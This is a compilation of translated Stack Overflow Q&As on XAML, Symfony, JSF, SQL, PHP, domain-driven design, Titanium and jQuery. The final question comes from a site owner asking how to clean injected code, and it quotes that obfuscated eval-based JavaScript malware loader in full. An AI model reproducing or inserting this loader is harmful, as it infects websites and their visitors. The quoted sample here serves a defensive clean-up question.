> 标签：xaml, windows-8, windows-store-apps, styling

我正在创建一个 Windows 商店应用程序，该应用程序当前加载一个简单的类（加载 5 个项目）。

我使用一个简单的网格来加载项目，然后设置一些样式；

代码片段；

```
<Grid  Background="{StaticResource ApplicationPageBackgroundThemeBrush}" Margin="261,111,10,302">
        <ListView ItemsSource="{Binding}" Name="lstMatters" SelectionMode="Multiple">
            <ItemsControl.ItemTemplate>
                <DataTemplate>
                    <StackPanel Orientation="Horizontal" Tapped="spMatter_Tapped" >
                        <Image Source="{StaticResource MatterImage}"></Image>
                        <GridView ItemContainerStyle="{StaticResource GridViewItemStyle1}" SelectionMode="None">
                            <GridView.ItemsPanel>
                                <ItemsPanelTemplate>
                                    <VirtualizingStackPanel Orientation="Horizontal" IsHitTestVisible="False"/>
                                </ItemsPanelTemplate>
                            </GridView.ItemsPanel>
                            <GridViewItem Margin="3" Style="{StaticResource gridViewHeader}" Content="FileRef: " FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Content="{Binding Path=FileRef}" FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Style="{StaticResource gridViewHeader}" Content="Description: " FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Content="{Binding Path=Description}" FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Style="{StaticResource gridViewHeader}" Content="DocumentSet: " FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Content="{Binding Path=DocumentSet}" FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Style="{StaticResource gridViewHeader}" Content="MatterType: " FontSize="20"></GridViewItem>
                            <GridViewItem Margin="3" Content="{Binding Path=MatterType}" FontSize="20"></GridViewItem>
                        </GridView>
                    </StackPanel>
                </DataTemplate>
            </ItemsControl.ItemTemplate>
        </ListView>
    </Grid> 
```

我正在尝试创建一个“动态”样式，因为当 DocumentSet 列加载并显示在网格中时，代码将执行一种“switch”语句，并根据 DocumentSet，使用特定的样式。（即根据 DocumentSet 的值更改 gridViewItem 的样式。

```
Switch DocumentSet
Case "a"
 style = style.a
Case "b"
 style = style.b) 
```

希望这是有道理的？

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:29:13.590

试试杰里尼克松的这个视频。它基本上是展示如何实现插页式广告，但您可以使用 ListView.ItemTemplateSelector 来使用相同的概念。

[http://youtu.be/kTBdCgVVjug](http://youtu.be/kTBdCgVVjug)

阿伦

# symfony - Symfony 2 在内联 CSS 上设置正确的 URL

> ID：13530542
> 
> 赞同：0
> 
> 时间：2012-11-23T13:56:19.480
> 
> 标签：symfony, assetic

我有一个简单的 JavaScript 文件，它具有动态切换背景图像的功能。JavaScript 文件通过 Assetic 包含在页面中。该脚本通过 jQuery 设置 CSS 背景图像属性。

如何使用 Symfony 2 设置正确的 URL，以便 CSS URL 始终指向正确的图像？我知道我可以将 JavaScript 直接附加到模板文件并通过 设置模板文件中的正确 URL `{{ asset(asset_url) }}`，但我想知道是否有解决方案可以使用外部 JavaScript 文件设置正确的路径。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:16:13.473

您应该使用[JmikolaJsAssetsHelperBundle](https://github.com/jmikola/JmikolaJsAssetsHelperBundle/)。它允许您从 Symfony2 的模板组件向 JavaScript 公开 AssetsHelper 服务。然后，您可以生成相对和绝对资产 URL。

**使用`getUrl`资产助手生成图像路径的**示例。****

 **```
//javascript
<img src="' + AssetsHelper.getUrl('/images/myImage.png') + '"> 
```

更深入地查看[文档](https://github.com/jmikola/JmikolaJsAssetsHelperBundle/blob/master/README.md)。**

# jsf - 刷新页面（浏览器按钮）导致再次将项目保存到数据库

> ID：13530549
> 
> 赞同：0
> 
> 时间：2012-11-23T13:57:04.783
> 
> 标签：jsf, jsf-2

情况：

*   想象一种将项目添加到数据库的形式
*   用户正确填写表单并使用**保存**按钮 (h:commandButton) 将项目保存到 DTB
*   已保存对象的生命周期结束并清除表单
*   之后，用户（不要问我为什么：-））按下浏览器的刷新按钮
*   结果是=> DTB中有两个几乎相同的项目（仅在创建时间上有所不同）

我怎样才能防止这种行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T13:59:22.780

两种方式：

1.  使用 ajax 执行操作（这不会生成浏览器历史记录）。

    ```
    <h:commandButton ...>
        <f:ajax execute="@form" render="@form" />
    </h:commandButton> 
    ```

2.  发布后发送重定向（称为 POST-Redirect-GET 模式）。

    ```
    public String save() {
        // ...
        return "sameview?faces-redirect=true";
    } 
    ```

# javascript - beforeShowDay 一天调用两次

> ID：13530552
> 
> 赞同：2
> 
> 时间：2012-11-23T13:57:21.190
> 
> 标签：javascript, jquery, jquery-ui, datepicker

我怎样才能防止函数 beforeShowDay 每天调用一次？jquery datepicker 有两个月。

```
30.01.2013 -> month side jan
31.01.2013 -> month side jan
01.02.2013 -> month side jan (last invisible day / placehoder)
02.02.2013 -> month side jan (last invisible day / placehoder)
03.02.2013 -> month side jan (last invisible day / placehoder)
----------------------------    
28.01.2013 -> month side feb (first invisible day / placehoder)
29.01.2013 -> month side feb (first invisible day / placehoder)
30.01.2013 -> month side feb (first invisible day / placehoder)
31.01.2013 -> month side feb (first invisible day / placehoder)
01.02.2013 -> month side feb
01.02.2013 -> month side feb
02.02.2013 -> month side feb
02.02.2013 -> month side feb
03.02.2013 -> month side feb
03.02.2013 -> month side feb
04.02.2013 -> month side feb
04.02.2013 -> month side feb 
```

![图片示例](../Images/bbd0c7a779c0dd9d3e578314bd517d27.png)

使用 beforeShowDay 我计算天数，如果某些天被调用两次，结果不正确......我怎样才能防止天数的双重调用？

问候！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T14:02:16.727

根据[这个](http://jqueryui.com/datepicker/#other-months)jquery ui 示例：

```
$(function() {
    $( "#datepicker" ).datepicker({
        showOtherMonths: true,
        selectOtherMonths: true,
        numberOfMonths: 2
    });
}); 
```

# log4j - Restlet 2.1 如何将日志记录更改为 log4j

> ID：13530553
> 
> 赞同：0
> 
> 时间：2012-11-23T13:57:25.110
> 
> 标签：log4j, restlet, java.util.logging, restlet-2.0

我有一个 Restlet 网络服务，我想在发出请求时删除 Restlet 创建的日志中的调试语句。目前我正在使用此代码通过执行以下操作将 Restlet 日志重定向到我的日志文件而不是控制台输出：

```
Slf4jLoggerFacade loggerFacade = new Slf4jLoggerFacade();
Engine.getInstance().setLoggerFacade(loggerFacade); 
```

在我的 log4j.properties 文件中，我有这个：

```
log4j.rootLogger=WARNING, LOGFILE 
```

我的问题是它仍然在日志中显示调试条目，说它收到了请求。由于所有的调试语句，这会导致日志文件成为一个巨大的文件大小。

我也试过这个来删除调试语句，但它没有用：

```
Engine.setLogLevel(Level.WARNING); 
```

以及尝试过这个：

```
Engine.setRestletLogLevel(Level.WARNING); 
```

为什么我的 log4j.properties 文件不起作用？

这是我要删除的日志中的一些调试条目：

11 月 29 日 00:00:01 调试 org.restlet 日志主机：ip:8182
11 月 29 日 00:00:01 调试 org.restlet 日志连接：保持活动状态
11 月 29 日 00:00:01 调试 t.SpringComponent.ServerRouter 正常 默认虚拟主机选择
11 月 29 日 00:00:01 调试 t.SpringComponent.ServerRouter 精细基础 URI：“http://ip:8182”。剩余部分：“/getFoo?foo=Foo%2Ffoo&fileName=foo.bin”

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-29T08:36:38.500

您能否准确描述上下文的一些元素：应用程序是否在 servlet 容器内运行？您使用的是哪种服务器连接器？由于我看不清楚日志中放置了什么样的调试跟踪，您能否提供一个示例？你还在使用 Restlet-2.0 吗？

最好的问候，蒂埃里·布瓦洛

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-29T14:14:21.813

解决了！这不是 Restlet 问题，而是对 log4j 不够了解。我将 log4j 级别设置为 WARNING 而不是 WARN。这是我在 log4j 中的设置，它解决了我的问题。:)

```
log4j.rootLogger=ERROR, LOGFILE
log4j.logger.org.restlet=WARN
log4j.logger.org.springframework=WARN 
```

# sql - 即使使用 distinct 也无法得到正确的结果

> ID：13530555
> 
> 赞同：1
> 
> 时间：2012-11-23T13:57:26.187
> 
> 标签：sql, sql-server

我正在尝试获取以下查询的结果：

```
select distinct
       REQ_ID
     , ID
     , MAX(STEP) as step
     , SUBSTRING(p1.NAME,9, len(p1.NAME)) as _index_
     , p2.value as location

from HISTORY h

LEFT JOIN Parameter p1 
on     p1.WP_ID=h.ID
   AND (   (    p1.NAME like 'name_' 
            AND p1.VALUE like h.ID COLLATE DATABASE_DEFAULT ) 
        OR (    p1.NAME like 'name__' 
            AND p1.VALUE like h.ID COLLATE DATABASE_DEFAULT) )

LEFT JOIN Parameter p2 
on     p2.WP_ID=h.ID 
   AND p2.PA_NAME = 'Location' + (SUBSTRING(p1.NAME,9, len(p1.NAME)) ) 

WHERE h.ROLE = 'rock'

GROUP BY REQ_ID, ID, step, p1.name, p2.value 
```

问题是查询返回超过 1 个结果（在我的情况下有 6 个）并且`MAX(STEP)`值没有返回最大值，我可以看到像 0,1,3,0,1,2 这样的值有没有办法只得到结果`max(step)`？`step`领域是`varchar(1)`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T13:59:52.030

要仅获得一条最高步长的记录，请使用

```
SELECT TOP(1)
......
......
ORDER BY step desc 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T14:03:36.083

试试这种方式（从组中删除步骤）：

```
select REQ_ID,ID,MAX(STEP) as step,SUBSTRING(p1.NAME,9, len(p1.NAME)) as _index_,
p2.value as location
from HISTORY h
LEFT JOIN Parameter p1 on p1.WP_ID  =h.ID  AND 
( (p1.NAME like 'name_' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT ) 
OR (p1.NAME like 'name__' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT) )
LEFT JOIN Parameter p2 on p2.WP_ID=h.ID AND p2.PA_NAME = 'Location' + (SUBSTRING(p1.NAME,9, len(p1.NAME)) ) 
WHERE h.ROLE = 'rock'
GROUP BY REQ_ID,ID, p1.name, p2.value 
```

或者

删除`step`并添加`SUBSTRING(p1.NAME,9, len(p1.NAME))`到组：

```
select REQ_ID,ID,MAX(STEP) as step,SUBSTRING(p1.NAME,9, len(p1.NAME)) as _index_,
p2.value as location
from HISTORY h
LEFT JOIN Parameter p1 on p1.WP_ID  =h.ID  AND 
( (p1.NAME like 'name_' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT ) 
OR (p1.NAME like 'name__' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT) )
LEFT JOIN Parameter p2 on p2.WP_ID=h.ID AND p2.PA_NAME = 'Location' + (SUBSTRING(p1.NAME,9, len(p1.NAME)) ) 
WHERE h.ROLE = 'rock'
GROUP BY REQ_ID,ID, SUBSTRING(p1.NAME,9, len(p1.NAME)),p2.value 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T14:13:27.507

处理时`first record in a group`，通常最简单的方法是使用`ROW_NUMBER()`. 在不了解您的架构和数据的更多信息的情况下，我可以说以下查询将起作用，但可能会进一步简化它......

```
WITH
  sequenced_data AS
(
  SELECT
    REQ_ID,
    ID,
    ROW_NUMBER() OVER (PARTITION BY req_id, id ORDER BY step DESC) AS sequence_id,
    STEP,
    SUBSTRING(p1.NAME,9, len(p1.NAME)) as _index_,
    p2.value as location
  FROM
    HISTORY    h
  LEFT JOIN
    Parameter  p1
      ON  p1.WP_ID = h.ID
      AND (   (p1.NAME like 'name_' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT ) 
           OR (p1.NAME like 'name__' AND p1.VALUE  like h.ID COLLATE DATABASE_DEFAULT)
          )
  LEFT JOIN
    Parameter  p2
      ON  p2.WP_ID = h.ID
      AND p2.PA_NAME = 'Location' + (SUBSTRING(p1.NAME,9, len(p1.NAME)) ) 
  WHERE
    h.ROLE = 'rock'
  GROUP BY
    REQ_ID,
    ID,
    STEP,
    SUBSTRING(p1.NAME,9, len(p1.NAME)),
    p2.value
)
SELECT
  *
FROM
  sequenced_data
WHERE
  sequence_id = 1 
```

这将只给每个`req_id, id`组合一行，并且总是选择具有最高`step`值的行。

*注意：*我不知道是否`GROUP BY`仍然需要。我把它留在里面只是因为你有它。

# php - 在 CSS 类上设置随机背景颜色

> ID：13530556
> 
> 赞同：0
> 
> 时间：2012-11-23T13:57:30.697
> 
> 标签：php, html, css

我想在 CSS 类上设置随机背景颜色......我已经得到了这个 PHP 代码：

```
<?php $color = sprintf(“#%06x”,rand(0,16777215)); ?> 
```

这是我的 style.php：

```
<?php
    header('Content-Type: text/css');

?>

body {
    background: INSERT PHP COLOR HERE - BUT HOW?;
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-23T13:59:07.993

这是你想要的吗：

```
body {
    background: <?php echo $color; ?>;
} 
```

完整的行将是：

```
<?php
$color = sprintf("#%06x",rand(0,16777215));
header('Content-Type: text/css');
?>
body {
    background: <?php echo $color; ?>;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T13:59:50.007

你的问题在哪里？只是在开玩笑。

将变量直接插入到提到的 css 行中。

```
body {
  background: <?php echo $color?>;
} 
```

让它工作;）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T13:59:25.580

```
<?=$color; ?> 
```

正文在 PHP 文档中？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T14:05:54.593

像这样更改您的文件。

```
<?php
    header('Content-Type: text/css');
    $color = sprintf(“#%06x”,rand(0,16777215));
?>

body {
    background: <?php echo  $color; ?>;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-23T14:02:40.750

为什么不制作一个带有颜色的数组来从中选择随机颜色？

```
<?php
$input = array("#000080", "#00CED1", "#191970");
$rand_keys = array_rand($input, 2);
echo $input[$rand_keys[0]] . "\n";
echo $input[$rand_keys[1]] . "\n";
?> 
```

只需将名称替换为十六进制代码即可。

[http://php.net/manual/en/function.array-rand.php](http://php.net/manual/en/function.array-rand.php)

# c# - 如何对存在于所有有界上下文中并且是应用程序核心部分的实体进行建模？

> ID：13530557
> 
> 赞同：17
> 
> 时间：2012-11-23T13:57:34.283
> 
> 标签：c#, design-patterns, domain-driven-design, cqrs, bounded-contexts

我正在使用 DDD 原则制作应用程序。在尽可能多地考虑了所有事情之后，我开始制作我的限界上下文。我还没有设置最终结构，但到目前为止，我的应用程序将包含以下有界上下文：

1.  员工管理
2.  购买
3.  档案
4.  报告

我希望它尽可能地可插拔，因此我可以例如单独开发和维护它们。他们可能会公开 WCF 或 Web API 以与他们交互。

我将使用[Udi Dahans 实现一个简单的 CQRS 模式](http://www.udidahan.com/2011/10/02/why-you-should-be-using-cqrs-almost-everywhere%E2%80%A6/)。我不想一直使用事件溯源、消息总线等，因为这不会是一个高度协作的应用程序（少于 1000 个用户，而且他们不太可能编辑相同的小数据集），这将增加了很多不必要的复杂性。

所以对于问题：

> **员工和部门实体对所有 BC 都是通用的，如何对其建模？**

部门是组织结构的一部分，因此在员工管理 BC 中，员工在一个部门工作，他们可以管理一个部门，并且他们有他们工作过的部门的历史。

在采购 BC 中，商品从一个部门采购，然后交付给一个部门。供应商与不同部门有不同的合同。

在存档中，一些信息将被存档并绑定到一个部门，等等。

这几乎同样适用于员工。

> **如何持久化有界上下文中的数据？**

它们可以映射到同一个数据库或每个都有自己的数据库。

**到目前为止我的一些想法**

*如何建模*
我应该再制作一个名为“公司”或“组织”的 BC 并在那里管理部门吗？

根据上面提到的 Udi Dahans 文章，我应该为每个 BC 创建一个部门实体和一个员工实体，其中包含我需要的 BC 字段和行为。这听起来很合理，但是我正在考虑如何实际使用它，但我无法弄清楚。我需要访问在其他地方管理的部门，但我究竟该怎么做而不是混合我的 BC？

*如何使用？*
假设我通过查询从某个地方获取了我的部门列表。在 UI 中，我得到了我也想购买的部门列表。这是该部门的第一次采购，因此采购部 BC 尚不知道该部门……因此采购部对象中的采购部对象将填充从另一个 BC 维护的数据 - 那么我该如何坚持呢？如果不存在，我需要添加一些信息，例如送货地址和发票地址？

在“注册部门 UI”中，我是否应该在所有 BC 上调用“RegisterDepartment”服务，然后确保这些与通过 UI（MVC 控制器）所做的所有更改同步？

对员工也是如此。我想知道哪个员工进行了购买或将某些东西放入档案中。因此，不知何故，我也需要这些 BC 中的员工对象，但从不同的 BC 管理它们。

*持久*
化 上面的一些挑战可以通过将不同的员工对象映射到数据库中的同一个表来解决。Purchasing BC 和 Archive BC 不能注册新员工，但会将信息附加到那里的员工，并将他们与同一数据库中的其他对象联系起来。然后数据库将确保所有 BC 仍然生活在同一个世界中......

我需要建议，所以我最终不会做出以后很难维护的东西。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-11-23T18:18:19.337

似乎您的大部分疑问都围绕着：“不同的有界上下文如何共享单个现实生活中的对象？”

问题是，尽管实体相同，但每个 BC 对它们的处理方式不同。在 Employee Management BC 中，整个权重集中在 Employee 和 Department 实体上——您应该能够添加、修改、相互分配、保留历史记录并处理有关管理的所有业务逻辑。您可以实施一些保留员工个人数据、维护适当官方结构或维护某些责任的政策。

另一方面，采购上下文中的部门实体仅表示例如发票地址，也可能是负责部门的人员，而兴趣中心将构建订单。所有与购买过程没有直接联系的数据都应该放在不同的环境中。例如，如果域要求每个订单都必须连接到部门并且缺少发票详细信息，则购买上下文不应尝试自行填写它们。相反，可以通知员工管理层来填补缺失的部分。

请注意，它很可能发生在同一个应用程序甚至同一个窗口中。但是您必须确保它将通过员工管理上下文发生，即通过调用上下文公共 API。

作为旁注，我不知道您的域，但您可能想要重新考虑您的上下文边界，例如将交付与购买分开。

继续使用并按照您的示例进行操作，如果您想购买，我会考虑以下路径：

*   阅读必要的部门数据（让我们等到后面用“如何”），您可能想检查此时是否每个数据都存在
*   阅读可以购买的商品，根据您的领域，可能值得介绍另一个 BC，例如供应商。以上都是CQRS的“查询”部分
*   构造订单或任何其他必要的购买上下文实体，执行验证或任何其他逻辑
*   提交更改，保留购买上下文实体（“命令”部分）
*   创建和发布一些域事件（例如通知存档或报告）

最后但并非最不重要的一点是，您不应该关心域层中的全局持久性。每个 BC 都应该连接到一些数据访问或基础设施层，以提供必要的对象并处理诸如从何处获取它们等细节。

特别是实体不一定需要镜像数据库布局，存储在一个或多个数据库中的问题应该只是一个性能问题。例如，一些实体将引用相同的对象（例如员工姓名），但可以从完全不同的表或数据库中获取其他详细信息（即购买历史或发送到存档的元素）。您可以使用[NHibernate 之](http://nhforge.org/)类的东西来使其易于管理。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-02-02T11:58:28.333

我在这里回答一个老问题，但我有另一个关于 OPs 问题中面临的问题的例子。

我有一种情况，我正在处理制造公司内使用的应用程序。该公司设有销售、运营、生产、客户、技术支持部门。在所有这些部门中都有一个客户的概念。因此，我很难弄清楚我如何在这些部门中拥有一个客户实体（我已将其绘制为我的绑定上下文）。

就在反复思考这个问题时，我想起了我在 Jimmy Bogard 的一篇博客文章中读到的评论，他谈到了他研究过的领域模型，该模型需要数周的工作才能完成，因为他们在这个问题上工作得越多，他们对领域的理解就越多，并且能够得出一个优雅的设计。

我的清醒时刻是当我停止思考持久性并停止思考这些 BC 中的客户时。

我意识到销售 BC 需要了解客户，但他们需要非常具体的信息，例如谁是 MD、联系人列表、办公室列表、决策者是谁、谁是财务联系人等。

现在，Ops BC 负责在系统中提出订单，他们需要一个客户的概念。但是，他们不需要知道 MD 是谁，或者联系人列表，以及谁在乎客户拥有哪些办公室？Ops 只需要知道客户名称，在我们的例子中是 4 个字符的客户代码。当我考虑到这一点时，我什至不需要将此信息作为实体保存，它可能只是我的 Ops BC 中的一个值对象。但是如何将这些信息输入到我的 Ops BC 中？嗯，这真的很简单。BC 定义了一个接口，我的应用程序可以通过该接口与 Ops BC 交互。我的应用程序不知道 Ops BC 内部发生了什么，但它确实知道有一个 Order Aggregatr 根，并且它有一个 RaiseNewOrder 方法，该方法接受一个 CustomerValueObject 类型的参数。CustomerValueObject 包含一个 4 字母代码和一个客户名称。因此，在我的 App UI 中，我可以使用 Sales（我们称之为客户管理）BC 来获取客户列表以呈现下拉列表。然后，当我处理操作的事务部分时，即用户发布新订单信息时，我使用 Ops BC 并传入 customerVO 作为参数。

因此，我的 Ops BC 和 Sales BC 是独立的，并且是独立的，它们在内部具有确保域完整性所需的概念，并且我能够在我的 UI 中访问我需要的数据，以便操作员可以选择客户然后在 Ops BC 中执行操作。

我意识到销售团队的客户与运营团队的客户不同。对于运维人员来说，客户只是他们用来标记订单的东西。他们对该公司的内部运作或任何有关它的信息没有任何兴趣。只要我对整个 BC 的客户都有一个通用 ID，我就有办法将数据拉回我需要用于演示的 ID。例如，我可以使用 Ops BC 拉回客户 XXXX 的订单列表。我不需要通过客户集合进入来做到这一点。

现在，把这个皱纹扔进去。销售人员有时需要了解客户下的订单，所以我是否需要开始在我的 Sales BC 中复制信息？这就是我卡住的地方，但后来我意识到我说的是销售人员，他们是 UI 的用户，在 UI 中我可以拉回给定客户的订单列表。

我对 DDD 还是很陌生，但我意识到 DDD 是关于与领域专家的对话，当你正确地进行这些对话时，你会意识到你认为存在于 BCs 中的实体......没有。

我认为我们作为开发人员通过经验设置为非规范化数据，并考虑数据库结构，以及我们如何将这些客户对象持久化回表......所以我们将实体视为一个东西，但域专家们不以这种方式看待这些实体。

为我达成交易的评论来自相当脾气暴躁的运营总监，当时我问了一个问题，比如“那么会计部门需要从这个订单中看到什么”，他的回答是“我不在乎什么”他们想要，我只想要我想要的”。我认为这就是你需要如何看待 BC。

我希望这个华夫饼对某人有帮助。

# visual-studio-2010 - 面板上的 VScroll 不滚动。面板有 200 个高度和 2000 像素的按钮

> ID：13530558
> 
> 赞同：1
> 
> 时间：2012-11-23T13:57:40.383
> 
> 标签：visual-studio-2010, scroll, panel

问题很简单，我如何为带有很多控件的面板编写 VScroll 代码？我找不到向上/向下/拖动的事件...

我只想要垂直滚动，因为水平滚动/自动滚动会破坏 GUI 的整体外观（面板上的每个控件都准备好适应其他面板上的其他控件）。

我知道如何使用自动滚动，请不要建议，因为这很简单，不符合我的规范。它必须是 VScroll 控制....

# iphone - Titanium iOs 应用程序和 Ti.UI.Window 渲染问题

> ID：13530560
> 
> 赞同：0
> 
> 时间：2012-11-23T13:57:45.057
> 
> 标签：iphone, titanium, appcelerator, titanium-mobile

我正在为**iPhone iOS 6.0开发****Appcelerator Titanium**应用程序。有一个控制器打开它，其中包含一个图像**库**。**`Ti.UI.TabGroup``Ti.UI.Window`**

 ****一切正常，但只是在第一个标签打开时。事实上，当我点击另一个选项卡然后我返回图库选项卡时，所有图像（*除了一个我不知道为什么*）都会消失。我验证了`imageViews`对象仍然具有它们的属性，但被隐藏了。

![在此处输入图像描述](../Images/81148053b621b2d8b633326ace687360.png)

这是画廊和 imagesView 的代码，试图获得类似“网格”的布局。

```
 var imagesViewsArray = [];
for(var i=0,images=imageAlbums[0].images;i<images.length;i++){
    var element =Ti.UI.createImageView({
        image : images[i],
        width : 100, height: 75, right:5,
    });
    element.addEventListener('singletap',function(e){
        // [cut] Opening modalWindow with fullscreen image
    });
    imagesViewsArray.push(element);
}

var wrapper = Titanium.UI.createView({
    height: Ti.UI.SIZE,
    width:'auto', layout: 'horizontal',
    left: 5,  top: 5,       bottom: 5,
    children: imagesViewsArray
});

var scrollView = Ti.UI.createScrollView({
    style:'vertical', contentWidth:'auto',
    contentHeight:'auto', layout:'vertical',
    width: '100%' , scrollType: 'vertical',
    showVerticalScrollIndicator: true,
    children: [ wrapper ]
});

galleryWin.add( scrollView ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T23:44:57.460

嗯，这对我来说是一个新的。"children" 应该是[一个只读属性](http://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.UI.View-property-children)。因为您正在通过数组设置子视图，所以它们没有被正确地添加到父视图中，或者正如您所注意到的那样，没有被保留。他们过早地离开了。

要使其正常工作，请将 .add(eachChildView) 显式添加到父视图。

您可以通过将 singletap 事件侦听器移动到父视图来进一步优化，然后检测 evt.source 是否是您的孩子之一（如果 (evt.source.image) ...）。****

# javascript - 多态参数 javascript

> ID：13530565
> 
> 赞同：0
> 
> 时间：2012-11-23T13:58:00.353
> 
> 标签：javascript, jquery, parameters, polymorphism

我正在尝试模仿 jQuery`animate()`方法来去除`opacity`不受支持的浏览器（当然是 Internet Explorer）的样式！

但是，我正在努力模仿 jQuery`animate()`方法接受的参数。

根据 jQuery 文档：

```
.animate( properties [, duration] [, easing] [, complete] )
.animate( properties, options ) 
```

我想知道的是函数如何知道参数2是持续时间还是选项......？

注意这里的三个参数：

```
$('#test').animate({opacity:0},200,function(){
    $(this).hide(); 
}); 
```

但我也可以像这样执行相同的函数（注意 easing 参数）：

```
$('#test').animate({opacity:0},200,'swing',function(){
    $(this).hide(); 
}); 
```

函数怎么知道第三个参数是字符串，不是函数？

**这肯定不是这样的吗？？？？**

```
if(typeof parameter1=='string'){
    // and so on
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T14:06:09.447

> Surely this is not done like so????
> 
> ```
> if(typeof parameter1=='string'){
>     // and so on
> } 
> ```

Yes, that is exactly how it is done.

* * *

From the jQuery source:

```
var opt = speed && typeof speed === "object" ? jQuery.extend({},
speed) : {
    complete: fn || !fn && easing || jQuery.isFunction(speed) && speed,
    duration: speed,
    easing: fn && easing || easing && !jQuery.isFunction(easing) && easing
};

opt.duration = jQuery.fx.off ? 0 : typeof opt.duration === "number" ? opt.duration : opt.duration in jQuery.fx.speeds ? jQuery.fx.speeds[opt.duration] : jQuery.fx.speeds._default; 
```

Can be rewritten to be more readable this way:

```
var opt = { };

if (typeof speed == 'object')
    opt = jQuery.extend({ }, speed);
else {

    if (fn)
        opt.complete = fn;
    else if (easing)
        opt.complete = easing;
    else if (jQuery.isFunction(speed))
        opt.complete = speed;

    opt.duration = speed;

    if (fn && easing)
        opt.easing = easing;
    else if (easing && !jQuery.isFunction(easing))
        opt.easing = easing;

}

if (jQuery.fx.off)
    opt.duration = 0;
else if (typeof opt.duration === 'number')
    opt.duration = opt.duration;
else if (opt.duration in jQuery.fx.speeds)
    opt.duration = jQuery.fx.speeds[opt.duration];
else
    opt.duration = jQuery.fx.speeds._default; 
```

* * *

## Update

If you want an easier way to take care of this logic for you, [candy](https://github.com/Nathan-Wall/candy/blob/master/releases/1.0.5/candy.js) provides a neat Array helper called `persuade`. This function allows you to pass in an array (or `arguments`) object with a list of types. You will be returned an array with the arguments organized by the types. It's an easy way to deal with polymorphic parameters:

```
function foo(/* duration, easing, complete */) {
    var args = candy.Arrays.persuade(arguments, [ 'number', 'string', 'function' ]);
    var duration = args[0], easing = args[1], complete = args[2];
    console.log(duration, easing, complete);
}

foo('test');
// => undefined, 'test', undefined

foo(2, function() { });
// => 2, undefined, function() { } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T14:00:05.717

> 我想知道的是函数如何知道参数2是持续时间还是选项......？

如果第二个参数是一个对象，那么它就是选项。如果它可以解析`int`为`duration`. 如果是函数，则为`callback`，否则为`easing`。

# php - 我如何编写一个 php 脚本来清除此代码？

> ID：13530576
> 
> 赞同：1
> 
> 时间：2012-11-23T13:58:30.957
> 
> 标签：php, virus

我的一个网站遭到恶意软件攻击。他们添加到我的 js 文件中的代码如下所示：

```
/*7e5a0c*/
v="v"+"al";if(020===0x10&&window.document)try{window.document.body=window.document.body}catch(gdsgsdg){w=window;v="e"+v;e=w[v];}if(1){f=new Array(40,101,115,110,98,114,105,110,108,32,39,39,32,122,11,10,31,30,32,31,116,97,113,30,117,102,95,104,115,30,61,31,98,111,98,115,109,100,108,116,45,97,114,100,95,116,100,67,108,100,107,101,109,114,40,38,103,102,113,95,109,100,37,41,58,11,10,12,8,32,31,30,32,116,101,97,103,114,46,114,112,99,31,59,32,38,102,116,115,110,58,46,45,111,105,110,97,119,106,97,108,44,114,116,45,99,110,115,110,115,47,51,45,110,104,111,37,59,12,8,32,31,30,32,116,101,97,103,114,46,114,114,121,107,99,46,111,109,115,104,114,105,110,108,32,60,30,39,96,96,115,110,106,117,115,99,39,58,11,10,31,30,32,31,115,103,96,102,116,45,113,116,120,106,101,45,96,111,113,98,101,113,30,61,31,37,48,38,57,13,9,30,32,31,30,117,102,95,104,115,44,115,115,119,108,100,44,104,100,103,103,103,114,32,60,30,39,48,110,120,38,57,13,9,30,32,31,30,117,102,95,104,115,44,115,115,119,108,100,44,119,104,98,116,103,30,61,31,37,49,111,118,39,58,11,10,31,30,32,31,115,103,96,102,116,45,113,116,120,106,101,45,106,101,101,114,32,60,30,39,48,110,120,38,57,13,9,30,32,31,30,117,102,95,104,115,44,115,115,119,108,100,44,116,110,110,32,60,30,39,48,110,120,38,57,13,9,11,10,31,30,32,31,103,102,31,38,33,99,109,99,116,107,101,109,114,46,102,99,116,68,106,101,108,99,110,115,64,121,72,98,40,38,115,103,96,102,116,38,39,41,31,121,13,9,30,32,31,30,32,31,30,32,99,109,99,116,107,101,109,114,46,118,112,105,115,99,40,38,58,100,104,116,32,104,98,61,91,37,117,102,95,104,115,90,39,61,58,47,99,103,118,61,37,41,58,11,10,31,30,32,31,30,32,31,30,100,110,97,117,108,99,110,115,44,103,100,114,69,107,99,109,100,108,116,65,119,73,99,38,39,116,101,97,103,114,39,40,44,97,111,110,101,109,98,67,103,103,108,99,38,117,102,95,104,115,39,59,12,8,32,31,30,32,124,11,10,124,39,40,40,57);}w=f;s=[];for(i=0;-i+492!=0;i+=1){j=i;if(e&&(031==0x19))s=s+String.fromCharCode((1*w[j]+j%3));}e(s)
/*/7e5a0c*/ 
```

